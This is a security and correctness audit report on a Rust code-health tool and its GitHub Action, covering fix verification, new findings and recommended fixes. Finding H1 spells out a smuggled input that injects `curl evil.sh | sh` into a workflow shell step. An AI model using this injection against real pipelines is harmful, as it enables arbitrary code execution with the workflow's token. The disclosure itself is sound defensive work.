# Hardening cycle 6 — fix verification and fresh audit

**Anchor:** `9dd2539` (v0.27.0) · **Baseline:** `deea354` (cycle-5 anchor, v0.25.1) · **Delta:** 14 commits (PRs #211–#222) spanning the v0.26.0 (`3b2fba4`) and v0.27.0 (`9dd2539`) cuts.

Audited against the published v0.27.0 artifacts: the three workspace crates were pulled from crates.io (packaged at exactly `9dd2539`, per each crate's `.cargo_vcs_info.json`), and the non-crate tree was fetched pinned to `9dd2539` from `raw.githubusercontent.com`. No branch state was mutated. The workspace pins Rust `1.96.0` via `rust-toolchain.toml` and the toolchain host is unreachable from the audit environment, so **nothing in this report rests on a `cargo` run** — every claim is anchored to source at `9dd2539`, to a re-reading executed here, or to primary documentation. The two residual limits — the differential and MCP claims that would need a live binary, and the negotiated MCP protocol revision — are named as such in §9.

---

## 0. What this cycle actually is

This is the second consecutive fix-verification-heavy cycle. Of the 14 commits in the delta, most exist to implement cycle-5 findings: #211 landed the security/gate/correctness batch, #212–#220 the deferred backlog and a first-run-UX pass, #221–#222 two small corrections. So the first question again is not "what is broken" but "did the fixes land, and did they land *whole*".

The headline: **cycle 5's fixes are, overwhelmingly, real.** Of ten Highs, seven are fully closed with regression tests that actually exercise the previously-defective path — including the two hardest (H1's cache-poisoning and H3's label-leak), which shipped with genuine straddle tests rather than tests that pass by construction. Of 28 Mediums, 15 are fully fixed, 7 are partially fixed with sound engineering judgement, and only 3 are untouched. That is a good rate, and it should be said plainly before the rest of this report, which is about the exceptions.

The exceptions cluster into one shape, and it is the same shape as last cycle: **a fix that closed its named surface but stopped one step short of a downstream consumer.** Cycle 5 named this pattern out loud (its H1 and H7 were cycle-4 fixes that stopped short). It recurs here, four times, and three of the four are new Highs:

- The Action-injection fix (cycle-5 H5) env-routed six inputs at their read sites — and then let the `version` input re-enter a `run:` body one hop downstream through a step output. The file's own comments now assert a safety property it does not have. **(H1)**
- The gate-exit-code fix (cycle-5 M12) correctly moved `diff` violations to exit 1 — and left the documentation prescribing exit 4, contradicting the same document's own taxonomy. A CI script that followed the docs to build exit-code logic is now silently disarmed. **(H3)**
- The `fail_on_skipped` fix (cycle-5 H7) minted a `"(skipped)"` sentinel path for the exit-facing violation set — and the SARIF emitter, which normalizes two sibling sentinels to `.`, was never taught the third, so `check --format sarif` anchors a Code-Scanning alert to a phantom file. **(M3)**
- The cache-poisoning fix (cycle-5 H1) guards on a zero-commit witness — a witness that is *always* zero for a head-only ingest, so `codelore calibrate` now does its full complexity scan twice per corpus repo and can never cache. **(M1)**

Two more Highs are fresh rather than residual: the flagship "Health over time" workflow — the 0.27.0 documentation headline, and the documented path for the exact goal a health tool exists to serve — cannot run as written (**H2**), and the MCP `delta_health` verdict systematically mis-scores renames and is blind to deletions (**H4**). One High is an unclosed residual from cycle 5 (**H5**).

Five Highs, sixteen Mediums, a Low table and four informational items survived adversarial validation. Every High and every load-bearing Medium in this report was read directly against the v0.27.0 source by the author, independently of the pass that first surfaced it.

A note on severity, unchanged from prior cycles: the rule is **consumer blast radius, not code-smell elegance**. A defect that can move a `check` / `diff` / `gate` exit code, an MCP verdict, or a CI outcome is High. A defect that only makes CLI output uglier is Low. A defect with no in-tree consumer is informational. Under that rule a documented command that exits 2 is High (H2), and a shell metacharacter in an unvalidated input is High (H1).

---

## 1. Verdict table — cycle-5 findings against v0.27.0

Every cycle-5 finding, re-verified against the shipped tree. "Partial (sound)" means the fix took a different path than recommended and the shipped path is defensible.

### Cycle-5 High

| ID | Subject | Verdict |
|---|---|---|
| H1 | Blind-ingest store cached before the witness runs | **Fixed** — guard before rename (`facts/mod.rs:427`), `CACHE_EPOCH`→`schema_v18` (`cache.rs`), non-neutered test (`cache_test.rs`). *Introduced M1 (this cycle).* |
| H2 | Three remediation strings prescribe `--no-cache` | **Partial → still open** — the new witness path got the `--cache-dir` clause (`facts/mod.rs:613`); the schema-mismatch and dirty-worktree strings did not. Refiled **H5**. |
| H3 | `calibrate-defects` temporal split leaks positive labels | **Fixed** — positives held wholly on one side (`calibrate_defects.rs`), rationale corrected, genuine straddle test. |
| H4 | Repo-relative code-health has no cohort floor | **Fixed** — `MIN_COHORT_FILES = 10` in SQL and Rust (`code_health.rs`), real 2-file/10-file regression test. |
| H5 | `action.yml` interpolates caller inputs into `run:` bodies | **Partial → still open** — six inputs env-routed; `version` re-splices one hop downstream. Refiled **H1**. |
| H6 | `panic = "abort"` × long-lived MCP server | **Fixed** — `panic = "unwind"` (`Cargo.toml`); the JoinError arm is now reachable. |
| H7 | `"skipped"` verdict never moves an exit code | **Fixed** — `[gates].fail_on_skipped` honoured by check/gate/diff; formerly-dead helpers made live. *Left M3 (this cycle) at the SARIF emitter.* |
| H8 | `main_ruleset_put` wholesale PUT, no drift check | **Fixed** — drift check parameterized over both rulesets, fatal for protect-main (`cut-release.sh`). |
| H9 | SARIF `security-severity` documented 2.5× off | **Fixed** — both docs now `/10`. |
| H10 | F-item ledger status rot in both directions | **Partial** — named rows reconciled, F231 genuinely closed; cut-time stamping never built, so the ledger has **re-rotted** at scale. Refiled **M16**. |

### Cycle-5 Medium (compact)

Fixed (15): M1, M2, M3, M5, M7, M8, M12, M13, M14, M15, M16, M18, M19, M20, M22, M27, M28 — *(17 rows; see note)*. Partial (sound): M4 (per-file gate got the exact witness; `no_new_cycles` kept its change-set skip, defensible), M6 (doc corrected; startup `worktree prune` not added — see **M4** this cycle), M9 (exact error-code + annotation asserts landed; protocolVersion still unasserted — see **M9** this cycle), M10 (semaphore landed; cancellation did not — see **M8** this cycle), M11 (doc option taken), M17 (docstring corrected; guard not broadened), M21 (rationale added; still module-local), M26 (flag errors reclassified; I/O-as-Analysis sites remain). Unfixed (3): **M23** (differential fixtures — refiled **M12**), **M24** (calibrate mining ingest — refiled **M14**), **M25** (sqlite offline hint — refiled **M15**). *No cycle-5 Medium regressed.*

*(Note: the fixed set is counted as "15 distinct findings fully closed" in the prose; the row list above names every Medium that reached a fixed or fixed-adjacent state, which is why it enumerates more than 15 IDs — M4/M6/M9/M10/M17/M21/M26 are the partials, listed under their own heading.)*

### Cycle-5 Low / informational

L: 6 fixed (L4, L6, L7, L8, L16, L22), 1 partial (L24 — param docs fixed, but `mcp.rs:467` still ships `"(default: all)"`; refiled as a Low here), 17 untouched (cosmetic / architectural / historical-CHANGELOG). I1–I4: unchanged.

---

## 2. High-severity findings

### H1 — The Action's `version` input re-enters a `run:` body one hop downstream, so the cycle-5 injection fix left a live shell-command injection behind a comment claiming it is closed

Cycle 5's H5 fix routed six caller-controlled inputs through the environment so a crafted value could not break out of the shell. The `Run codelore` step does this correctly (`action.yml:204-262`): every input is read from `$INPUT_*` inside the script, never spliced at render time. But the **install** step does not.

The `Resolve codelore version` step reads `inputs.version` safely via `$INPUT_VERSION` (`action.yml:65-68`), then — with no validation beyond an optional `v`-prefix (`:88-90`) — writes it verbatim to a step output (`:91-94`):

```bash
TAG="$VERSION"
echo "tag=$TAG"              >> "$GITHUB_OUTPUT"
echo "version=$VERSION_NO_V" >> "$GITHUB_OUTPUT"
```

The install step then splices that output back into its `run:` body at YAML-render time (`action.yml:143-144`):

```bash
TAG="${{ steps.resolve.outputs.tag }}"
VERSION="${{ steps.resolve.outputs.version }}"
```

A caller passing `version: '1.0"; curl evil.sh | sh; "'` yields `steps.resolve.outputs.tag = v1.0"; curl evil.sh | sh; "`, and line 143 renders to `TAG="v1.0"; curl evil.sh | sh; ""` — arbitrary command execution in the job, with the workflow's `GITHUB_TOKEN`. This is the canonical GitHub-Actions template-injection vector (the class `zizmor` calls `template-injection`); the env-routing that fixed the run step is exactly what the install step lacks.

The precondition is honest: the caller must control `version`, which in the common hardcoded `version: v0.27.0` usage is safe. But `version` is a *documented caller input* (`action.yml:37-40`), a `workflow_dispatch` or reusable-workflow author can wire an untrusted value into it, and this is a *published composite action* consumed by third parties. What makes it a High rather than a latent smell is that the file's own comments now assert the opposite — *"a crafted value cannot break out of the shell command"* (`:62-64`, `:205-207`) — so a maintainer reading the resolve step is actively told the surface is closed. **Fix:** env-route the two outputs at the install step exactly as the run step does — read `INPUT_TAG`/`INPUT_VERSION` from `env:` instead of `${{ steps.resolve.outputs.* }}` — and, belt-and-braces, validate the resolved tag against `^v[0-9]+\.[0-9]+\.[0-9]+` in the resolve step before it is ever written to an output.

### H2 — The flagship "Health over time" workflow cannot run: it feeds `--format html` to two analyses that reject it

The 0.27.0 documentation headline is a README section and an Action-guide pattern that assemble `health-trend` / `architecture-trend` / `check` / `--ratchet` into the loop for *"tracking codebase and architecture health over time"* — the precise job the tool exists to do. The Action-guide version (`docs/github-action.md:145-163`) runs:

```yaml
- uses: emrecdr/codelore@v1
  with: { analysis: health-trend, format: html, output: health-trend.html }
- uses: emrecdr/codelore@v1
  with: { analysis: architecture-trend, format: html, output: architecture-trend.html }
```

Both `health-trend` and `architecture-trend` resolve to `supported_formats() == STREAM == &["csv","json","markdown"]` (`analyze.rs:523`, `:555-556`). `html` is not in the set, so `analyze` returns `unsupported_format(...)` → `CodeLoreError::InvalidOptions` → **exit 2** at the dispatch guard (`analyze.rs:618-623`, reached from `:657`/`:673`). Both steps fail on first run; the `upload-artifact` at `:162-163` collects a `*-trend.html` that was never produced.

This is not a corner case — it is the documented happy path for the stated goal, copy-pasteable, and it exits 2 immediately. **Fix:** the trends have no HTML emitter, so either point the example at `--format markdown` (or `csv` for machine use), or, if an HTML rendering is wanted, wire `write_health_trend_html` / `write_architecture_trend_html` and add both to `HTML_WIRED`. The two-line doc fix is correct and shippable today; the emitter is the larger option. Either way the README's linked walkthrough (`README.md#tracking-health-over-time`) must be checked to the same standard.

### H3 — `diff --fail-on` silently moved from exit 4 to exit 1, and the docs still tell CI to branch on 4

Cycle 5's M12 correctly recommended that a `diff` gate violation stop overloading the analysis-error bucket. The fix landed: `main.rs:508-513` now exits **1** on a diff gate violation (or a skip failed under `fail_on_skipped`), matching `check`/`gate`. The code is right.

The documentation is not. `docs/advanced-usage.md` still tells the reader, twice, that the `--fail-on` axis exits 4:

- `:746` — `--fail-on CONDITION   Exit non-zero (4) when condition fires:`
- `:821` — `Exit 4 (the analysis-failure code) when the condition fires.`

The same document then defines exit 4 as `Analysis error` (`:1318`) and states gate violations exit 1 (`:855`). So the doc simultaneously says `--fail-on` exits 4, that 4 means "analysis crashed", and that gate violations exit 1 — three mutually contradictory claims, one of them now false against the binary.

The blast radius is a disarmed PR gate. A user who followed `:746`/`:821` to write `if [ $? -eq 4 ]; then block_merge; fi` had a working gate under v0.25.1; the v0.26.0 upgrade silently moved the code to 1, and that branch never fires again — the violating PR merges green. This behaviour change is also **undisclosed in the 0.26.0 CHANGELOG's `--fail-on` context** (the entry discloses the gate-violation/`fail_on_skipped` paths, not the `--fail-on` axis). **Fix:** correct `:746` and `:821` to exit 1, and add a one-line "breaking: `diff --fail-on` now exits 1, not 4" note to the changelog so upgraders re-check their exit-code logic. The code needs no change.

### H4 — `delta_health` derives its "PR files" from head-side rows only, so it scores renames as risky new code and cannot see deletions

The MCP `delta_health` tool answers an agent's "did this change hurt code health?" It ingests the base and head revisions into separate in-memory stores, then builds the touched-file set from the head side alone (`mcp.rs:881-882`):

```rust
// All files touched between the two revs count as "PR files".
let pr_files: HashSet<String> = head_fns.iter().map(|r| r.path.clone()).collect();
```

The comment says *all files touched*; the code captures only files that have function rows **at head**. `compute_delta_health` then filters both the base and head indices by this set (`delta_health.rs:270`), and classifies each surviving function by `(base.is_some(), head.is_some())` (`:298-302`). Two common change classes break:

- **A pure rename** (`git mv` of a large, complex file): its functions exist in `base_fns` under the *old* path and in `head_fns` under the *new* path. `pr_files` holds only the new path, so the old-path rows are filtered out of the base index entirely. Every function then reads as `(false, true)` — a brand-new addition — and if the file is large or complex those additions classify as `Bad`, dropping the ratio and producing a *degrading* verdict for a change that moved code without touching it.
- **A whole-file deletion** (removing a red hotspot): the file has no rows at head, so its path never enters `pr_files`, and its base rows are filtered out. The improvement is invisible — deleting your worst file registers as `no-code-change` for that file.

So the tool systematically false-alarms on moves and is blind to the single most decisive health improvement (deletion). For an agent-facing verdict this is a correctness defect by the project's own rule. **Fix:** build `pr_files` from the union of base-side and head-side paths (`base_fns` ∪ `head_fns`), or better, from `git diff --name-only base..head` with rename detection so a rename is paired rather than counted as delete-plus-add — which also aligns the verdict with what `codelore diff` reports for the same range.

### H5 — Cycle-5 H2 is still open: two remediation strings and a doc still prescribe `--no-cache` on surfaces that have no such flag

Cycle 5 filed this as H2; the fix was partial. The witness message that the H1 work added does it right — when the surface has no `--no-cache`, it names the real escape hatch (`facts/mod.rs:613`, *"(check, gate, explain) offers no --no-cache flag, point it at a fresh cache with --cache-dir <scratch>"*). But the two pre-existing strings, both reachable from `check`/`gate`/`explain`/`diff`, still prescribe the nonexistent flag:

- `facts/mod.rs:258` — the **schema-version-mismatch** error (a hard failure in the cache-open path, reachable from every command): *"re-ingest with `--no-cache` or upgrade/downgrade codelore"*.
- `facts/mod.rs:366`, `:391` — the dirty-worktree staleness notice: *"Pass `--no-cache` to recompute"* / *"Commit changes or pass `--no-cache` to suppress this notice."*
- `docs/advanced-usage.md:1082`, `:1085` carry the same prescription.

`--no-cache` exists only on `AnalyzeArgs` (`args.rs:589`). The sharp one is `:258`: a `codelore check` run that hits a schema mismatch gets a hard error whose only remedy names a flag `check` rejects — a dead end on a CI gate surface. **Fix:** give these three strings the same treatment `:613` already got — name `--cache-dir <scratch>` (and, for `:258`, that a matching codelore version rebuilds the cache) rather than a flag the calling surface does not have.

---

## 3. Medium-severity findings

**M1 — The H1 cache-poisoning guard fires on every head-only ingest, so `calibrate` scans twice and never caches.** The guard added for cycle-5 H1 bails when `commit_count()? == 0` (`facts/mod.rs:427-434`), re-ingesting into memory rather than persisting. But `commit_count()` is `SELECT COUNT(*) FROM commits` (`:583`), and `ingest_head_only` never populates `commits` — its docstring says so: *"History tables stay empty"* (`ingest/mod.rs:225`, body `:229-248`). So for any head-only run the guard is *always* taken: the disk store is built (`facts/mod.rs:418`), discarded, and the full HEAD complexity scan — the expensive part — runs a second time into memory (`:432`). `codelore calibrate` sets `head_only_ingest: true` and goes through this cached constructor per corpus repo (`calibrate.rs:137`, `:140`), so it pays ~2× per repo and can never persist a head-only entry, defeating the cache on every re-run. Correctness is unaffected; the cost is real and permanent. **Fix:** make the witness mode-aware — for a head-only ingest the meaningful floor is head-state rows (complexity/function rows), not commit count; gate on the table the ingest actually populates.

**M2 — `check --ratchet` records a code-health floor even when no code-health gate is configured, contradicting the README.** The README states the ratchet *"tracks a metric only when the matching gate is configured, so step 2 comes first"* (`README.md:382`). Two of the three ratchet metrics honour this — `red_effort_pct` and `dependency_cycles` are read from ledger records that exist only if their gate ran (`check.rs:176-184`). But `code_health_min_observed` is read directly from the `run_code_health` scan (`check.rs:171-174`), which runs *unconditionally* (`:490-494`, gated only for the *violation* check at `:496`, not the scan). So a `check --ratchet` run with no `code_health_min` in the thresholds file still writes a code-health baseline (`:185-199`), and a later benign refactor that nudges the worst file's score down by recomputation noise fails the run with exit 1 — a gate the user never configured. **Fix:** gate `code_health_min_observed` on `thresholds.gates.code_health_min.is_some()` like its siblings, or carve code-health out of the README claim explicitly.

**M3 — `check --format sarif` + `fail_on_skipped` emits a SARIF result anchored to a phantom `(skipped)` file.** The `fail_on_skipped` fix promotes a skipped gate to a violation carrying the sentinel path `"(skipped)"` (the code guards against it as a real sentinel at `check.rs:966`), and those promoted violations reach the SARIF emitter (`check.rs:285-291`). But the emitter's pseudo-path normalization only maps two of the three sentinels to the repo-root `.` (`sarif.rs:789`):

```rust
let is_repo_wide = v.path == "(repo-wide)" || v.path == "(degraded)";
```

`"(skipped)"` is missing, so it falls to the `else` branch and is percent-encoded into a literal artifact URI. GitHub Code Scanning then anchors the alert to a nonexistent file `(skipped)` in the repo root. The exit code is correct; the published alert is malformed. **Fix:** add `|| v.path == "(skipped)"` to the `is_repo_wide` test (it is repo-wide by nature).

**M4 — The MCP server's `instructions` string still claims "Read-only." while `delta_health` writes worktrees.** Cycle 5's M6 corrected `advanced-usage.md`'s "All tools are read-only" claim, but the operator-facing string the server sends at the protocol layer was not touched: `instructions = "...Read-only. No network..."` (`mcp.rs:1654-1655`). The module docstring (`:11`) and the tool's own comment (`:798`, *"Not read-only: this is the one tool that writes outside the cache"*) both acknowledge that `delta_health` runs `git worktree add`, and its annotation is `read_only_hint = false` — so the code knows, but the string a client displays to the operator does not. The "No network" half was correctly caveated this cycle with the `CODELORE_LLM_*` clause; the "Read-only" half needs the same. **Fix:** soften to "No tool modifies tracked content; `delta_health` creates and removes throwaway worktrees," matching the doc wording that already shipped.

**M5 — The Action guide documents `check --format json`, which `check` rejects at parse time.** `docs/github-action.md:193` offers *"or `--format json` for a machine-readable report"* for `check`. But `CheckFormat` is `{ Text, Sarif }` (`args.rs:126-131`) — `json` is a `GateFormat` value (`:136-141`), not a check value — so `check --format json` exits 2 on a clap parse error. A reader onboarding gates by following the guide hits it immediately. **Fix:** the machine-readable check format is `sarif`; correct the doc (or, if a JSON check report is wanted, that is a feature, not a doc fix).

**M6 — The Action guide's "multiple analyses" matrix always fails one leg: `knowledge-islands` has no SARIF emitter.** The matrix at `docs/github-action.md:108-119` runs `analysis: [hotspots, knowledge-islands, clone-coupling]` with `format: sarif`. `hotspots` and `clone-coupling` support SARIF; `knowledge-islands` resolves to `STREAM_HTML == &["csv","json","markdown","html"]` (`analyze.rs:532`), which has no `sarif`, so that leg exits 2. The failure is loud (red matrix job) but the guide presents it as a working pattern, and the knowledge-island findings silently never reach Code Scanning. **Fix:** drop `knowledge-islands` from the SARIF matrix, or document that it uploads via a different format.

**M7 — The idempotent-publish check treats a transient registry error as "crate absent", re-injecting the double-publish failure it fixed.** Cycle 5's M28 fix makes crates.io publishing idempotent by probing the registry before publishing (`release.yml:358-372`). The probe uses `curl -sSf`, which fails (non-zero) on any non-2xx — including a transient 5xx or a timeout — and the script's logic reads that failure as "not yet published" and proceeds to `cargo publish`. If the crate *was* already published and the registry merely hiccuped, the publish fails on "already exists" and `set -e` aborts the job mid-sequence — exactly the unrecoverable state M28 set out to prevent, now behind a narrower (transient-fault) trigger. **Fix:** distinguish 404 (absent → publish) from other non-2xx (unknown → do not assume absent; retry the probe or fail closed without publishing).

**M8 — No MCP handler observes cancellation, so a cancelled cold call holds its semaphore permit to completion.** Cycle 5's M10 landed the concurrency bound — a 4-permit semaphore via the mandatory `blocking()` wrapper — but not the cancellation half. No handler takes a `RequestContext` or checks the per-request token, so a client that cancels a `hotspots` or `delta_health` call on a large repo during its cold ingest still runs the full ingest, holding one of four permits until it finishes. Under a few cancelled-and-retried calls the pool wedges. **Fix:** thread `RequestContext` into the handlers and check the cancellation token at ingest checkpoints, as the cycle-5 finding described.

**M9 — The MCP test suite still never asserts the negotiated protocol version.** The cycle-5 M9 fix added exact error-code and annotation assertions — real progress — but `mcp_test.rs:83` still only pins the *requested* `protocolVersion` and never asserts on the negotiated response value. Given the rmcp 3.1 bump this cycle inherits, a silent downgrade or renegotiation would pass the suite. **Fix:** assert the exact negotiated `protocolVersion` in the initialize response (this also closes the §9 residual — it is the one MCP claim in this report established by source-reading rather than a live handshake).

**M10 — `hotspots` truncates with no disclosure object, breaking the convention its three sibling tools follow.** Cycle 5's M5 clamped the `hotspots` row cap, but the tool truncates at the default without emitting the `{omitted, total}` object that `delta_health`, `function_hotspots` and the other list tools carry (`mcp.rs`, the `omitted_functions` pattern at `:894-902` is the model). The file's own convention is "absence of a summary object means the list is complete"; `hotspots` now violates it silently, so an agent reads a truncated ranking as exhaustive. **Fix:** emit the same `omitted`/`total` disclosure `delta_health` uses.

**M11 — Unbounded MCP outputs remain outside the row-cap regime.** `resolve_row_cap` now covers the list tools, but `check_gates` (one result per failing file), `gate_changes` (one line per violation) and `function_xray` (per-function rows) still return unbounded arrays. On a large violating repo these can blow an agent's token budget the same way the pre-M5 `hotspots` did. **Fix:** route these through the same cap-and-disclose helper.

**M12 — The differential harness still has no binary, non-ASCII, CRLF or gitlink fixtures.** `tests/differential_repo_test.rs` is the gix-vs-git-CLI parity oracle and it is genuinely thorough (31 functions) — but it is byte-identical to v0.25.1, and all three historical parity bugs in this project fell in exactly the classes it does not probe. Cycle 5 filed this as M23 and called it the highest-value test addition in the report; it remains untouched. **Fix:** add fixtures for a binary blob, a non-ASCII path and filename, a CRLF file, and a submodule gitlink.

**M13 — Two third-party actions float on tags in the `contents: write` dogfood job while the repo SHA-pins everything else.** `Swatinem/rust-cache@v2` and `benchmark-action/github-action-benchmark@v1` are tag-pinned (`ci.yml`, `bench.yml`), whereas cargo-deny, the docker actions, softprops, attest and dependabot are SHA-pinned — the repo clearly holds the SHA-pinning policy for supply-chain reasons and these two are exceptions. `rust-cache` runs in a job with `contents: write`. The exposure is bounded (`GITHUB_TOKEN`, not release secrets) and it is pre-existing, but it is the same class the project pins against elsewhere. **Fix:** SHA-pin both, and add the `zizmor` "unpinned-uses" check to CI so the policy is enforced rather than remembered.

**M14 — `calibrate-defects` mining ingest is still unguarded and unwitnessable.** Cycle 5's M24 is untouched: `calibrate_defects.rs` runs its mining ingest with no witness and `include_merges: true`, so a depth-1 merge tip yields `commit_count() == 1` — the standard witness could not catch a truncated checkout here even if added, because it tests for zero. The pre-existing `MIN_LINKED_DEFECTS` floor bounds the damage to a vacuous-looking report rather than tuned-on-noise weights, which is why this is Medium not High. **Fix:** gate this path against a meaningful commit floor for calibration (a few hundred), not the zero-witness.

**M15 — `output/sqlite.rs` still gives no offline hint when the DuckDB `sqlite` extension can't be downloaded.** Cycle 5's M25 is untouched: the failure mode is "the extension needs a network fetch", and the message names neither the network nor an offline path, so an air-gapped user sees an opaque extension-load error. **Fix:** detect the offline case and add an actionable hint.

**M16 — The F-item ledger has re-rotted: 26 rows say `Fixed (Unreleased)` against an empty `[Unreleased]`.** Cycle 5's H10 diagnosed the mechanism precisely — `Fixed (Unreleased)` stamps become unbacked when `[Unreleased]` is drained at a release cut — and reconciled the specific rows it named. But the *cause* (no cut-time re-stamping step) was never addressed, and two release cuts later `deep_analysis_report.md` carries 26 `Fixed (Unreleased)` rows while the CHANGELOG `[Unreleased]` section is empty. Work that shipped in v0.26.0 and v0.27.0 is still stamped "Unreleased" in the ledger the team reads to know what is done. This is the same defect, at larger scale, from an unaddressed root cause. **Fix:** the durable one is a step in `cut-release.sh` that rewrites `Fixed (Unreleased)` → `Fixed (vX.Y.Z)` at the cut; the immediate one is a manual reconciliation of the 26 rows against the two shipped versions.

---

## 4. Low and informational

| ID | Finding | Anchor |
|---|---|---|
| L1 | `refactoring_targets` MCP input schema still advertises `"(default: all)"` — the one place the MCP surface still misdescribes itself to an agent (cycle-5 L24 residual). | `mcp.rs:467` |
| L2 | Hotspots MCP param doc says "Default: 20"; the code caps at 50. `code_health` doc says "return all files" against a 50-row default. | `mcp.rs` |
| L3 | SARIF `security-severity` in-code comment describes the hotspot `/4` origin that H9 already corrected in the docs; the comment is now the last stale copy. | `sarif.rs:4`, `:181` |
| L4 | The new `action:` CI job exercises the composite action but asserts nothing adversarial, so it would not catch an H1/H5-class regression. | `ci.yml` |
| L5 | SLSA level comment reads "L3" where GitHub's `attest-build-provenance` provides Build L2 (see §7). | `release.yml` |
| L6 | `actions/checkout@v4` in the Action-guide examples vs `@v7` in the repo's own workflows — a version-drift inconsistency in copy-paste docs. | `docs/github-action.md` |
| L7 | 17 cycle-5 Lows remain untouched (cosmetic output, architectural refactors, historical-CHANGELOG accuracy). Enumerated in cycle 5 §4; unchanged. | — |

| ID | Informational | Note |
|---|---|---|
| I1 | The 43/54/57 analysis-count drift across docs persists in places; no single count is authoritative. | Cross-doc |
| I2 | `changes.similarity` was cleanly dropped (schema 7→8) with zero surviving readers — a model migration; recorded as a positive. | `schema_v1.sql` |
| I3 | `panic = "unwind"` is now consistent across all build surfaces (verified against Containerfile, workflows, `build.rs`); no surface still forces abort. | — |
| I4 | F262 (Kaplan-Meier) remains "Active (design)"; no code, nothing dangling. | Ledger |

---

## 5. The honesty ledger

**What was refuted.** Each finding above survived an adversarial validator whose default verdict was REFUTED. Much did not survive, and the refutations are as informative as the findings:

- *"The cache-key change (#218) needs a `CACHE_EPOCH` bump it didn't get."* Refuted. The new key preimage folds the whole `Options` and the package version, so old-format entries are unreachable by construction — a bump would additionally orphan every `diff --base-cache` file for no gain. The reasoning is airtight; the epoch did move (v17→v18) in this delta, but in 0.26.0 for the shallow-poison fix, not for #218.
- *"schema 7→8 left a dangling `changes.similarity` reader."* Refuted — zero readers remain; the event-stream similarity and the differential cross-check both survive and mean something different.
- *"The `hotspots` clamp (M5) can be bypassed like before."* Refuted — it now routes through `resolve_row_cap` and truncates. (The residual is *disclosure*, not the cap — filed as M10.)
- *"The semaphore releases its permit early / isn't panic-safe."* Refuted — the permit is held across the whole blocking section and released on unwind now that `panic = "unwind"` landed.
- *"The `profile` cache-size sum diverges from what the pruner evicts against."* Refuted — sum basis and eviction basis share one walk and one pair of named constants; they cannot drift.
- *"A previously-vacuous `cache_test` invariance is still un-failable."* Refuted — cycle 5 flagged it; it was genuinely rewritten to co-vary the arguments it used to hold apart.
- *"The rmcp 3.1 bump moved the negotiated protocol revision."* Refuted — the lockfile is identical to v0.25.1's rmcp `3.1.0`; `LATEST` is unchanged, and stdio insulates the server from the transport changes regardless. (Latest is now `3.1.1`, 2026-08-05; see §7.)
- *"C-3's anchor is wrong — `sarif.rs` contains no `(skipped)`."* Half-true and instructive: `sarif.rs` contains no `(skipped)` **because that is the bug** — the sentinel the emitter fails to handle is the one it never mentions. The anchor (`sarif.rs:789`) is correct; the defect is an omission, confirmed by reading the `is_repo_wide` test directly.

**On the shape of this report.** Five new/residual Highs against cycle 5's ten fixed is not a regression in quality — seven of ten cycle-5 Highs are fully closed with real tests, which is a good rate. It is the same lesson cycle 5 wrote down, now with a fourth data point: **when a fix adds a normalization, a sentinel, a witness, or an env-route, check every consumer that reads the thing it changed.** H1 (the run step was env-routed, the install step wasn't), H3 (the code moved to exit 1, the docs didn't), M1 (the witness fits full ingest, not head-only), M3 (two sentinels normalized, the third minted the same day wasn't) are one defect wearing four hats.

**What could not be verified here, and why.**

1. **Nothing compiled.** `rustc 1.95.0` is present, the workspace pins `1.96.0`, and the toolchain host is unreachable. Every claim is source-, re-reading-, or documentation-anchored. Two findings would be strengthened by a live binary: H4's rename/deletion inversion (described precisely enough above to reproduce with two `git mv` commits and one `delta_health` call) and M1's double-ingest (observable as two complexity passes in one `calibrate` invocation).
2. **The negotiated MCP protocol revision is source-read, not handshake-verified.** One command settles it — run `codelore mcp` against a client and read the initialize response — and M9 recommends baking that into `mcp_test.rs`.
3. **Provenance of the Medium set.** Every High and load-bearing Medium was read against source by the author. The MCP output-bounds items (M8, M10, M11) and the release-pipeline transient-fault item (M7) were surfaced by the audit passes and confirmed against the cited anchors; they are the ones most worth a second reader's eyes before they are actioned.

---

## 6. The one fix to make first

**H1**, the Action `version` injection — not because it is the highest-probability breakage (that is H2), but because it is the only one that is a security vulnerability in shipped code *and* the file's own comments assert it is closed. The recovery profile is the worst kind: a maintainer auditing `action.yml` reads *"a crafted value cannot break out of the shell command"* at the exact step where it can, so the defect is self-concealing to the next reader. The fix is small and mechanical — env-route `steps.resolve.outputs.tag`/`.version` at the install step the way the run step already routes its six inputs, and validate the resolved tag against a version regex before it is written to an output.

Ship H2 in the same PR. It is the highest-probability *functional* breakage — the flagship "track health over time" workflow exits 2 on first run — and its doc fix is two lines. H1 and H2 are both on the Action surface; one PR closes the sharpest security edge and the most-hit onboarding failure together.

---

## 7. Improvement options beyond the defects

These are not defects; they are current-practice deltas the research pass surfaced. Each names what the tree does today and the concrete change. Version and date claims here are single- or few-source and are marked accordingly; confirm before actioning.

- **Bump rmcp `3.1.0` → `3.1.1`** (released 2026-08-05, *verify against docs.rs before pinning*). The changelog reports it fixes emission of the now-required `ttlMs`/`cacheScope` cache hints on `tools/list`. Low effort; the lockfile is otherwise current. RustSec cross-reference of the full `Cargo.lock` came back **clean**.
- **Migrate crates.io publishing to Trusted Publishing (OIDC)** via `rust-lang/crates-io-auth-action`, retiring the long-lived `CRATES_IO_TOKEN`. This is the current recommended mechanism and removes a standing secret from the release job. Medium effort.
- **Adopt `zizmor` in CI.** Run against this tree it flags the template-injection class (H1/F-findings), unpinned third-party actions (M13), and over-broad job permissions. Adding it as a required check turns the SHA-pinning and env-routing policies from conventions into gates. Low-medium effort.
- **Correct the SLSA claim.** The release comment reads "SLSA L3" (L5); `actions/attest-build-provenance` provides **Build L2** per GitHub's own docs. Fix the comment, and consider GitHub immutable releases + `gh attestation verify` in the Action's install step so the checksum step is backed by attestation rather than a bare `SHA256SUMS`.
- **Bump the Rust pin** `1.96.0` → current stable (reported `1.97.1`, *verify at blog.rust-lang.org*) at the next release, driven through the six pin sites the new `rust_version_pins_test` now guards.
- **DuckDB is current** (crate `1.10505.0` = engine 1.5.5, 2026-07-22). Add a cache-open-failure fallback test ahead of the announced DuckDB 2.0 ("Fall 2026") so a breaking on-disk format change degrades to re-ingest rather than a hard error.
- **Competitive note:** CodeScene is shipping an OSS Code-Health MCP server; its rules-configuration-over-MCP is the one feature the delta does not answer. code-maat remains dormant. Worth a roadmap line, not a fix.

---

## 8. Docs to update with these fixes

| Doc | Change | Driven by |
|---|---|---|
| `docs/github-action.md:152-159` | `format: html` → `markdown` (or wire trend HTML emitters) | H2 |
| `README.md#tracking-health-over-time` | Re-verify every command runs as written | H2 |
| `docs/advanced-usage.md:746`, `:821` | `--fail-on` exits **1**, not 4 | H3 |
| `CHANGELOG.md` (0.26.0) | Disclose the `diff --fail-on` 4→1 change as breaking | H3 |
| `docs/github-action.md:193` | `check` machine format is `sarif`, not `json` | M5 |
